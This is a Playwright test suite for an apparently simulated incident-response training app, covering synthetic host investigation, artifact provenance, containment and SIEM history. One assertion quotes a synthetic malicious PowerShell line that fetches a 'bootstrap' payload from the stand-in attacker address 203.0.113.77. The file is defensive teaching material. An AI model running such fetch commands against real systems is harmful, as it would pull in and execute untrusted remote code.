import {
  expect,
  test,
  type Page,
} from "@playwright/test";

const suspiciousScript =
  "/Users/smartinez/AppData/Local/Temp/finance-update.ps1";
const adminScript =
  "/ProgramData/Acme/IT/backup-health.ps1";

async function runRangeCommand(
  page: Page,
  command: string,
) {
  const input = page.getByLabel(
    "Range command",
  );

  await input.fill(command);
  await page.getByRole(
    "button",
    { name: "Run", exact: true },
  ).click();
}

async function openRange(
  page: Page,
) {
  await page.getByRole(
    "button",
    { name: "Range", exact: true },
  ).click();

  return page.getByRole(
    "region",
    { name: "Range synthetic host workspace" },
  );
}

async function openCase(
  page: Page,
) {
  await page.locator(".workspace-nav").getByRole(
    "button",
    { name: /^Case/ },
  ).click();

  return page.getByRole(
    "region",
    { name: "Case incident command workspace" },
  );
}

test("Endpoint pivots into a coherent synthetic host and supports controlled investigation commands", async ({
  page,
}) => {
  await page.goto("/");

  await page.getByRole(
    "button",
    { name: "Endpoint", exact: true },
  ).click();

  const edr = page.getByRole(
    "region",
    { name: "EDR endpoint workspace" },
  );

  await expect(edr).toContainText("FIN-LT-04");
  await edr.getByRole(
    "button",
    { name: "Open synthetic host" },
  ).click();

  const range = page.getByRole(
    "region",
    { name: "Range synthetic host workspace" },
  );

  await expect(range).toBeVisible();
  await expect(range).toContainText("FIN-LT-04");
  await expect(range).toContainText("powershell.exe");
  await expect(range).toContainText("7300");
  await expect(range).toContainText("8420");
  await expect(range).toContainText("QuarterlyReview.docm");
  await expect(range).toContainText("203.0.113.77:443");

  await runRangeCommand(page, "ps");
  await expect(
    range.locator(".range-terminal-output"),
  ).toContainText(
    "8420   running",
  );

  await runRangeCommand(page, "net");
  await expect(
    range.locator(".range-terminal-output"),
  ).toContainText(
    "203.0.113.77:443",
  );

  await runRangeCommand(
    page,
    `cat ${suspiciousScript}`,
  );
  await expect(
    range.locator(".range-terminal-output"),
  ).toContainText(
    "Invoke-WebRequest https://203.0.113.77/bootstrap",
  );

  await runRangeCommand(page, "kill 8420");

  const powershellState = range
    .locator(".range-inspector-row")
    .filter({ hasText: "8420" });

  await expect(powershellState)
    .toContainText("terminated");
  await expect(
    range.locator(".range-terminal-output"),
  ).toContainText(
    "Terminated synthetic host process 8420.",
  );
});

test("Range rejects unknown commands and reset reconstructs the authored host", async ({
  page,
}) => {
  await page.goto("/");
  let range = await openRange(page);

  await runRangeCommand(page, "kill 8420");
  await expect(
    range.locator(".range-pane-heading").first(),
  ).toContainText("1 commands");

  await runRangeCommand(page, "whoami");
  await expect(range).toContainText(
    "Unknown Range command: whoami. Type help for the supported command set.",
  );
  await expect(
    range.locator(".range-pane-heading").first(),
  ).toContainText("1 commands");

  await page.getByRole(
    "button",
    { name: "Reset scenario" },
  ).click();
  range = await openRange(page);

  await expect(
    range.locator(".range-pane-heading").first(),
  ).toContainText("0 commands");
  await expect(
    range
      .locator(".range-inspector-row")
      .filter({ hasText: "8420" }),
  ).toContainText("running");
});

test("Range network acquisition appears in Case with artifact provenance", async ({
  page,
}) => {
  await page.goto("/");
  const range = await openRange(page);

  await runRangeCommand(page, "net");
  await range.getByRole(
    "button",
    { name: "Acquire artifact to Case" },
  ).click();

  await expect(range).toContainText(
    "Artifact acquired",
  );
  await expect(range).toContainText(
    "artifact range-command-1-artifact · immutable acquisition snapshot",
  );

  const caseWorkspace = await openCase(page);
  const evidenceLedger = page.getByRole(
    "region",
    { name: "Case evidence ledger" },
  );
  const provenance = page.getByLabel(
    "Range artifact provenance",
  );

  await expect(caseWorkspace).toBeVisible();
  await expect(evidenceLedger).toContainText(
    "Range evidence collected (network): network:state",
  );
  await expect(evidenceLedger).toContainText("range");
  await expect(evidenceLedger).toContainText(
    "ip: 203.0.113.77",
  );
  await expect(provenance).toContainText(
    "artifact: range-command-1-artifact",
  );
  await expect(provenance).toContainText(
    "source: network:state",
  );
  await expect(provenance).toContainText(
    "method: controlled range command",
  );
  await expect(provenance).toContainText(
    "integrity: unavailable (source did not provide integrity)",
  );
  await expect(provenance).toContainText(
    "lineage: process:8420",
  );

  await page.getByRole(
    "button",
    { name: "Reset scenario" },
  ).click();
  await page.locator(".workspace-nav").getByRole(
    "button",
    { name: "Case", exact: true },
  ).click();

  await expect(
    page.getByRole(
      "region",
      { name: "Case evidence ledger" },
    ),
  ).toContainText(
    "Collect events from SIEM, Endpoint, Identity, or Investigation",
  );
});

test("Range file acquisition preserves authored SHA-256 provenance in Case", async ({
  page,
}) => {
  await page.goto("/");
  const range = await openRange(page);

  await runRangeCommand(
    page,
    `cat ${suspiciousScript}`,
  );
  await range.getByRole(
    "button",
    { name: "Acquire artifact to Case" },
  ).click();

  await expect(range).toContainText(
    "Artifact acquired",
  );

  await openCase(page);

  const provenance = page.getByLabel(
    "Range artifact provenance",
  );

  await expect(provenance).toContainText(
    "artifact: range-command-1-artifact",
  );
  await expect(provenance).toContainText(
    `source: ${suspiciousScript}`,
  );
  await expect(provenance).toContainText(
    "integrity: sha256 9e6c9d2f14d2178fd2f7fbf7712c610d53c67c84f2ed8086697245db4f73fa1b",
  );
  await expect(provenance).toContainText(
    "lineage: process:8420",
  );
});

test("Range host history separates benign and suspicious activity and survives containment", async ({
  page,
}) => {
  await page.goto("/");
  const range = await openRange(page);
  const terminal = range.locator(
    ".range-terminal-output",
  );

  await runRangeCommand(page, "history");
  const fullHistory = range
    .locator(".range-command-block")
    .last();

  await expect(fullHistory).toContainText(
    "Process 4104 started",
  );
  await expect(fullHistory).toContainText(
    "Connection range-connection-teams opened",
  );
  await expect(fullHistory).toContainText(
    "Process 7300 started",
  );
  await expect(fullHistory).toContainText(
    "Connection range-connection-admin-health opened",
  );
  await expect(fullHistory).toContainText(
    "Service AcmeBackupAgent startup changed manual -> automatic",
  );
  await expect(fullHistory).toContainText(
    "Process 8420 started",
  );
  await expect(fullHistory).toContainText(
    "Connection range-connection-powershell opened",
  );

  const adminPowershell = range
    .locator(".range-inspector-row")
    .filter({ hasText: "7300" });

  await adminPowershell.getByRole(
    "button",
    { name: "Trace history" },
  ).click();
  await expect(
    page.getByLabel("Range command"),
  ).toHaveValue("history process 7300");
  await page.getByRole(
    "button",
    { name: "Run", exact: true },
  ).click();

  const adminHistory = range
    .locator(".range-command-block")
    .last();

  await expect(adminHistory).toContainText(
    "Process 7300 started",
  );
  await expect(adminHistory).toContainText(
    `execute ${adminScript} by process 7300`,
  );
  await expect(adminHistory).toContainText(
    "Configuration HKLM/System/CurrentControlSet/Services/AcmeBackupAgent/Start changed",
  );
  await expect(adminHistory).toContainText(
    "Connection range-connection-admin-health opened",
  );
  await expect(adminHistory).toContainText(
    "Connection range-connection-admin-health closed",
  );
  await expect(adminHistory).toContainText(
    "Process 7300 terminated",
  );
  await expect(adminHistory).not.toContainText(
    "203.0.113.77",
  );
  await expect(adminHistory).not.toContainText(
    "Process 8420 started",
  );

  const suspiciousPowershell = range
    .locator(".range-inspector-row")
    .filter({ hasText: "8420" });

  await suspiciousPowershell.getByRole(
    "button",
    { name: "Trace history" },
  ).click();
  await expect(
    page.getByLabel("Range command"),
  ).toHaveValue("history process 8420");
  await page.getByRole(
    "button",
    { name: "Run", exact: true },
  ).click();

  const suspiciousHistory = range
    .locator(".range-command-block")
    .last();

  await expect(suspiciousHistory).toContainText(
    "Process 8420 started",
  );
  await expect(suspiciousHistory).toContainText(
    "Connection range-connection-powershell opened",
  );
  await expect(suspiciousHistory).not.toContainText(
    "range-connection-admin-health",
  );
  await expect(suspiciousHistory).not.toContainText(
    "Process 7300 started",
  );

  await suspiciousHistory.getByRole(
    "button",
    { name: "Acquire artifact to Case" },
  ).click();
  await openCase(page);

  const evidenceLedger = page.getByRole(
    "region",
    { name: "Case evidence ledger" },
  );
  const provenance = page.getByLabel(
    "Range artifact provenance",
  );

  await expect(evidenceLedger).toContainText(
    "Range evidence collected (history): history:process:8420",
  );
  await expect(evidenceLedger).toContainText(
    "ip: 203.0.113.77",
  );
  await expect(provenance).toContainText(
    "source: history:process:8420",
  );
  await expect(provenance).toContainText(
    "lineage: process:8420",
  );

  await openRange(page);
  await runRangeCommand(page, "kill 8420");

  const connection = range
    .locator(".range-inspector-row")
    .filter({ hasText: "203.0.113.77:443" });

  await expect(connection).toContainText("closed");

  await runRangeCommand(
    page,
    "history process 7300",
  );
  const adminAfterContainment = range
    .locator(".range-command-block")
    .last();

  await expect(adminAfterContainment).toContainText(
    "Connection range-connection-admin-health opened",
  );
  await expect(adminAfterContainment).toContainText(
    "Process 7300 terminated",
  );

  await runRangeCommand(
    page,
    "history process 8420",
  );
  const afterContainment = range
    .locator(".range-command-block")
    .last();

  await expect(afterContainment).toContainText(
    "Connection range-connection-powershell opened",
  );
  await expect(terminal).toContainText(
    "Terminated synthetic host process 8420.",
  );

  await page.getByRole(
    "button",
    { name: "Reset scenario" },
  ).click();
  const resetRange = await openRange(page);

  await runRangeCommand(
    page,
    "history process 7300",
  );
  await expect(
    resetRange
      .locator(".range-command-block")
      .last(),
  ).toContainText(
    "Connection range-connection-admin-health opened",
  );

  await runRangeCommand(
    page,
    "history process 8420",
  );
  await expect(
    resetRange
      .locator(".range-command-block")
      .last(),
  ).toContainText(
    "Connection range-connection-powershell opened",
  );
});

test("Range relationship pivots preserve distinct PowerShell lineage through containment", async ({
  page,
}) => {
  await page.goto("/");
  const range = await openRange(page);

  const adminPowershell = range
    .locator(".range-inspector-row")
    .filter({ hasText: "7300" });

  await adminPowershell.getByRole(
    "button",
    { name: "Trace relationships" },
  ).click();

  const relationshipContext = page.getByRole(
    "region",
    { name: "Range relationship context" },
  );

  await expect(relationshipContext).toContainText(
    "Process 7300",
  );
  await expect(relationshipContext).toContainText("7200");
  await expect(relationshipContext).toContainText(
    "account-mchen",
  );
  await expect(relationshipContext).toContainText(
    adminScript,
  );
  await expect(relationshipContext).toContainText(
    "range-connection-admin-health",
  );
  await expect(relationshipContext).toContainText(
    "rel-admin-powershell-backup-health",
  );
  await expect(relationshipContext).toContainText(
    "rel-admin-powershell-backup-startup",
  );
  await expect(relationshipContext).not.toContainText(
    suspiciousScript,
  );

  const suspiciousPowershell = range
    .locator(".range-inspector-row")
    .filter({ hasText: "8420" });

  await suspiciousPowershell.getByRole(
    "button",
    { name: "Trace relationships" },
  ).click();

  await expect(relationshipContext).toContainText(
    "Process 8420",
  );
  await expect(relationshipContext).toContainText(
    "6172",
  );
  await expect(relationshipContext).toContainText(
    "account-smartinez",
  );
  await expect(relationshipContext).toContainText(
    suspiciousScript,
  );
  await expect(relationshipContext).toContainText(
    "range-connection-powershell",
  );
  await expect(relationshipContext).toContainText(
    "rel-powershell-finance-update",
  );
  await expect(relationshipContext).not.toContainText(
    adminScript,
  );

  await relationshipContext.getByRole(
    "button",
    { name: `Stage cat ${suspiciousScript}` },
  ).click();
  await expect(
    page.getByLabel("Range command"),
  ).toHaveValue(`cat ${suspiciousScript}`);

  await page.getByRole(
    "button",
    { name: "Run", exact: true },
  ).click();
  await range.getByRole(
    "button",
    { name: "Acquire artifact to Case" },
  ).click();

  await runRangeCommand(page, "net");
  await range.getByRole(
    "button",
    { name: "Acquire artifact to Case" },
  ).click();

  await openCase(page);

  const lineage = page.getByRole(
    "region",
    { name: "Case artifact lineage" },
  );

  await expect(lineage).toContainText(
    "range-command-1-artifact",
  );
  await expect(lineage).toContainText(
    "range-command-2-artifact",
  );
  await expect(lineage).toContainText(
    "process:8420",
  );

  await openRange(page);
  await runRangeCommand(page, "kill 8420");

  const connection = range
    .locator(".range-inspector-row")
    .filter({ hasText: "203.0.113.77:443" });

  await expect(connection).toContainText("closed");

  await openCase(page);
  await expect(lineage).toContainText(
    "process:8420",
  );

  await page.getByRole(
    "button",
    { name: "Reset scenario" },
  ).click();
  await page.locator(".workspace-nav").getByRole(
    "button",
    { name: "Case", exact: true },
  ).click();

  await expect(
    page.getByRole(
      "region",
      { name: "Case artifact lineage" },
    ),
  ).toContainText(
    "Acquire multiple related Range artifacts",
  );
});

test("Finalized runs cannot acquire new Range artifacts", async ({
  page,
}) => {
  await page.goto("/");
  const range = await openRange(page);

  await runRangeCommand(page, "net");

  await page.locator(".workspace-nav").getByRole(
    "button",
    { name: "Investigation", exact: true },
  ).click();
  await page.getByRole(
    "button",
    { name: "Finalize investigation" },
  ).click();

  await openRange(page);

  await expect(
    page.getByLabel("Range command"),
  ).toBeDisabled();
  await expect(
    range.getByRole(
      "button",
      { name: "Run finalized" },
    ),
  ).toBeDisabled();
});

test("Range containment becomes canonical EDR and SIEM response history", async ({
  page,
}) => {
  await page.goto("/");
  const range = await openRange(page);

  await runRangeCommand(page, "kill 8420");

  const connection = range
    .locator(".range-inspector-row")
    .filter({ hasText: "203.0.113.77:443" });

  await expect(connection).toContainText("closed");

  await page.locator(".workspace-nav").getByRole(
    "button",
    { name: "Endpoint", exact: true },
  ).click();

  const hostHistory = page.getByRole(
    "region",
    { name: "EDR Range response history" },
  );

  await expect(hostHistory).toBeVisible();
  await expect(hostHistory).toContainText(
    "HOST_PROCESS_TERMINATED",
  );
  await expect(hostHistory).toContainText("8420");

  await hostHistory.getByRole(
    "button",
    { name: "Open canonical event in SIEM" },
  ).click();

  const siem = page.getByRole(
    "region",
    { name: "SIEM search workspace" },
  );

  await expect(
    page.getByLabel("SIEM query"),
  ).toHaveValue(
    "eventId:range-command-1-event",
  );
  await expect(siem).toContainText(
    "Range terminated process 8420",
  );
  await expect(siem).toContainText(
    "HOST_PROCESS_TERMINATED",
  );
});
